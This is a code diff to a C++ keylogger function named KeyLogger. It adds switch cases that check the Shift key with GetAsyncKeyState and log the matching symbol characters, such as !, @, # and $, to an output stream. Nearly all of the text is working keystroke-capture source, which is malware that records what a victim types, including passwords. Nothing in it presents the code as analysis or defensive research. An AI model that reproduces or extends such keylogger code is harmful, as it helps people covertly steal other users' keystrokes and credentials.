@@ -47,9 +47,75 @@ void KeyLogger(void)
                 // Shift keys 
 
                 switch (character){
+                    case 45:{
+                        if(GetAsyncKeyState(0x10) & 0x8000){
+                            write << "_";
+                        }else {write << character;}
+                        break;
+                    }
+                    case 48:{
+                        if(GetAsyncKeyState(0x10)){
+                            write << ")";
+                        }else {write << character;}
+                        break;
+                    }
                     case 49:{
                         if(GetAsyncKeyState(0x10)){
                             write << "!";
+                        }else {write << character;}
+                        break;
+                    }
+                    case 50:{
+                        if(GetAsyncKeyState(0x10)){
+                            write << "@";
+                        }else {write << character;}
+                        break;
+                    }
+                    case 51:{
+                        if(GetAsyncKeyState(0x10)){
+                            write << "#";
+                        }else {write << character;}
+                        break;
+                    }
+                    case 52:{
+                        if(GetAsyncKeyState(0x10)){
+                            write << "$";
+                        }else {write << character;}
+                        break;
+                    }
+                    case 53:{
+                        if(GetAsyncKeyState(0x10)){
+                            write << "%";
+                        }else {write << character;}
+                        break;
+                    }
+                    case 54:{
+                        if(GetAsyncKeyState(0x10)){
+                            write << "^";
+                        }else {write << character;}
+                        break;
+                    }
+                    case 55:{
+                        if(GetAsyncKeyState(0x10)){
+                            write << "&";
+                        }else {write << character;}
+                        break;
+                    }
+                    case 56:{
+                        if(GetAsyncKeyState(0x10)){
+                            write << "*";
+                        }else {write << character;}
+                        break;
+                    }
+                    case 57:{
+                        if(GetAsyncKeyState(0x10)){
+                            write << "(";
+                        }else {write << character;}
+                        break;
+                    }
+                    case 61:{
+                        if(GetAsyncKeyState(0x10)){
+                            write << "+";
                         }else {write << character;}
                         break;
                     }
